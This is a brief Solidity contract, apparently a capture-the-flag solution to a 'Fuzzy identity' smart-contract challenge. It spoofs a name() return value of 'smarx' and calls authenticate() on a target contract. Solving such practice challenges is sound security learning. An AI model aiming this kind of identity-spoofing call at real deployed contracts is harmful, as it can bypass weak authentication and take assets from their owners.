pragma solidity ^0.8.0;


contract AttackFuzzyIdentity {


    function name() external view returns (bytes32) {
        return bytes32("smarx");
    }
    function attack(address _contract) external {

        _contract.call(abi.encodeWithSignature("authenticate()"));
    }


}
